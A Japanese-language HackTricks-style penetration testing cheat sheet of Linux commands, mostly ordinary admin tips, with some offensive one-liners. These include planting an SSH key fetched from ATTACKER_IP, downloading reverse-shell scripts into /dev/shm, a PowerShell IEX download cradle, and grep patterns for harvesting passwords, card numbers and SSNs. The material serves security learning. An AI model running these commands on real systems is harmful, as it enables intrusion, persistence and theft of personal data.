# 便利なLinuxコマンド

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか？または、HackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手してください。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>

## 一般的なBashコマンド
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化することができます。\
今すぐアクセスを取得してください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Windows用のBash
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## グレップ

`grep`コマンドは、テキストファイル内で特定のパターンを検索するために使用されます。以下は、`grep`コマンドの一般的な使用法です。

```bash
grep [オプション] パターン ファイル名
```

- `[オプション]`：`grep`コマンドのオプションを指定します。例えば、`-i`オプションは大文字と小文字を区別しない検索を行います。
- `パターン`：検索するテキストのパターンを指定します。
- `ファイル名`：検索対象のファイル名を指定します。

例えば、以下のコマンドは、`file.txt`というファイル内で「hello」という文字列を検索します。

```bash
grep hello file.txt
```

`grep`コマンドは、検索結果を表示するだけでなく、他のコマンドと組み合わせて使用することもできます。例えば、`grep`コマンドの出力を別のファイルにリダイレクトすることもできます。

```bash
grep hello file.txt > output.txt
```

また、`grep`コマンドは正規表現を使用してパターンを指定することもできます。正規表現を使用することで、より柔軟な検索が可能になります。

```bash
grep -E '[0-9]{3}-[0-9]{3}-[0-9]{4}' file.txt
```

上記の例では、`file.txt`内で電話番号のパターン（XXX-XXX-XXXX）を検索しています。

`grep`コマンドは、Linuxシステムで非常に便利なツールです。検索やパターンマッチングに関連する作業を効率的に行うために、`grep`コマンドを積極的に活用しましょう。
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Nmap検索のヘルプ

Nmap is a powerful network scanning tool used to discover hosts and services on a computer network. It provides a wide range of options and features to customize and optimize the scanning process. Here are some useful commands and options to help you get started with Nmap:

Nmapは、コンピュータネットワーク上のホストやサービスを発見するために使用される強力なネットワークスキャンツールです。スキャンプロセスをカスタマイズして最適化するためのさまざまなオプションと機能を提供しています。以下に、Nmapを使い始めるための便利なコマンドとオプションをいくつか紹介します。

### Basic Scanning

基本的なスキャン

To perform a basic scan of a target host, use the following command:

ターゲットホストの基本的なスキャンを実行するには、次のコマンドを使用します。

```
nmap <target>
```

Replace `<target>` with the IP address or hostname of the target host.

`<target>`をターゲットホストのIPアドレスまたはホスト名に置き換えてください。

### Specifying Ports

ポートの指定

By default, Nmap scans the most common 1,000 ports. However, you can specify a custom range of ports to scan using the `-p` option. For example:

デフォルトでは、Nmapは最も一般的な1,000ポートをスキャンします。ただし、`-p`オプションを使用してスキャンするポートのカスタム範囲を指定することができます。例えば：

```
nmap -p <port-range> <target>
```

Replace `<port-range>` with the desired range of ports (e.g., `80-100` for ports 80 to 100).

`<port-range>`を希望するポートの範囲（例：ポート80から100の場合は`80-100`）に置き換えてください。

### Service and Version Detection

サービスとバージョンの検出

Nmap can also detect the services and versions running on open ports. Use the `-sV` option to enable service and version detection. For example:

Nmapは、オープンポートで実行されているサービスとバージョンを検出することもできます。サービスとバージョンの検出を有効にするには、`-sV`オプションを使用します。例えば：

```
nmap -sV <target>
```

Replace `<target>` with the IP address or hostname of the target host.

`<target>`をターゲットホストのIPアドレスまたはホスト名に置き換えてください。

### OS Detection

OSの検出

Nmap can also attempt to detect the operating system running on the target host. Use the `-O` option to enable OS detection. For example:

Nmapは、ターゲットホストで実行されているオペレーティングシステムを検出する試みも行うことができます。OS検出を有効にするには、`-O`オプションを使用します。例えば：

```
nmap -O <target>
```

Replace `<target>` with the IP address or hostname of the target host.

`<target>`をターゲットホストのIPアドレスまたはホスト名に置き換えてください。

### Script Scanning

スクリプトスキャン

Nmap has a scripting engine that allows you to run scripts to automate various tasks during the scanning process. Use the `--script` option to specify a script to run. For example:

Nmapには、スキャンプロセス中にさまざまなタスクを自動化するためのスクリプトを実行するためのスクリプトエンジンがあります。実行するスクリプトを指定するには、`--script`オプションを使用します。例えば：

```
nmap --script <script> <target>
```

Replace `<script>` with the name of the script and `<target>` with the IP address or hostname of the target host.

`<script>`をスクリプトの名前、`<target>`をターゲットホストのIPアドレスまたはホスト名に置き換えてください。

These are just a few examples of the many options and features available in Nmap. For more information, refer to the [Nmap documentation](https://nmap.org/documentation.html).

これは、Nmapで利用可能な多くのオプションと機能のうちのいくつかの例です。詳細については、[Nmapのドキュメント](https://nmap.org/documentation.html)を参照してください。
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

Bash（Bourne Again SHell）は、LinuxおよびUNIXシステムで広く使用されているデフォルトのシェルです。Bashは、コマンドラインでの操作やスクリプトの作成に使用されます。

### 一般的なコマンド

以下は、Bashでよく使用される一般的なコマンドのいくつかです。

- `ls`：現在のディレクトリ内のファイルとディレクトリを表示します。
- `cd`：ディレクトリを変更します。
- `pwd`：現在のディレクトリのパスを表示します。
- `mkdir`：新しいディレクトリを作成します。
- `rm`：ファイルやディレクトリを削除します。
- `cp`：ファイルやディレクトリをコピーします。
- `mv`：ファイルやディレクトリを移動します。
- `cat`：ファイルの内容を表示します。
- `grep`：テキストファイル内でパターンに一致する行を検索します。
- `chmod`：ファイルやディレクトリのアクセス権を変更します。

### ファイル操作

Bashを使用して、ファイルの作成、編集、および操作を行うことができます。

- `touch`：新しいファイルを作成します。
- `nano`：テキストエディタを使用してファイルを編集します。
- `vi`：テキストエディタを使用してファイルを編集します。
- `head`：ファイルの先頭から指定された行数を表示します。
- `tail`：ファイルの末尾から指定された行数を表示します。

### プロセス管理

Bashを使用して、実行中のプロセスを管理することができます。

- `ps`：実行中のプロセスを表示します。
- `top`：システムのリソース使用状況と実行中のプロセスを表示します。
- `kill`：プロセスを終了します。

### ネットワーキング

Bashを使用して、ネットワーク関連の操作を行うことができます。

- `ping`：ホストに対してICMPエコーリクエストを送信し、応答を受け取ります。
- `ifconfig`：ネットワークインターフェースの設定を表示および変更します。
- `netstat`：ネットワーク接続と統計情報を表示します。

これらは、Bashで使用される一般的なコマンドの一部です。Bashの機能は非常に広範であり、さまざまなタスクを実行するための多くのコマンドがあります。
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Iptablesは、Linuxシステムでネットワークトラフィックを制御するための強力なツールです。ファイアウォールルールを作成し、パケットのフィルタリング、NAT（ネットワークアドレス変換）、ポート転送などの機能を提供します。

### Iptablesの基本的なコマンド

以下は、Iptablesの基本的なコマンドです。

- ファイアウォールルールの表示：

```bash
iptables -L
```

- ファイアウォールルールの追加：

```bash
iptables -A <chain> -p <protocol> --dport <port> -j <action>
```

- ファイアウォールルールの削除：

```bash
iptables -D <chain> <rule_number>
```

- ファイアウォールルールの保存：

```bash
iptables-save > <file_name>
```

- ファイアウォールルールの復元：

```bash
iptables-restore < <file_name>
```

### Iptablesのチェーン

Iptablesでは、パケットの処理を制御するためにチェーンを使用します。以下は、Iptablesで使用される主要なチェーンの一部です。

- INPUT：入力トラフィックを処理するためのチェーン
- OUTPUT：出力トラフィックを処理するためのチェーン
- FORWARD：転送トラフィックを処理するためのチェーン

### Iptablesのアクション

Iptablesでは、パケットに対して実行されるアクションを指定することができます。以下は、Iptablesで使用される主要なアクションの一部です。

- ACCEPT：パケットを受け入れる
- DROP：パケットを破棄する
- REJECT：パケットを破棄し、送信元に拒否メッセージを返す
- LOG：パケットをログに記録する

### Iptablesの応用例

以下は、Iptablesを使用して特定のポートをブロックする例です。

```bash
iptables -A INPUT -p tcp --dport 22 -j DROP
```

このコマンドは、SSHポート（ポート22）への入力トラフィックをブロックします。

### Iptablesの注意点

Iptablesの設定は慎重に行う必要があります。誤った設定はネットワークの可用性に影響を与える可能性があります。設定変更前には、バックアップを作成し、テスト環境での動作を確認することをお勧めします。

以上が、Iptablesの基本的な概要です。Iptablesを使用してネットワークトラフィックを制御するためのさまざまな機能を活用してください。
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
